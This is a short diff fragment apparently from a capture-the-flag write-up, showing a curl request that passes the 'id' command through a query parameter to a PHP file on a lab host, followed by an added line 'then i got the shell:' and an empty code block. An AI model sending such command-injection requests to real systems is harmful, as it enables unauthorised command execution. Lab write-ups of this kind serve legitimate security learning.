@@ -365,3 +365,8 @@ curl -s "http://portal.variatype.htb/files/glyph-check.php?x=id"
 < HTTP/1.1 200 OK
 ```
 
+then i got the shell:
+
+```
+
+```
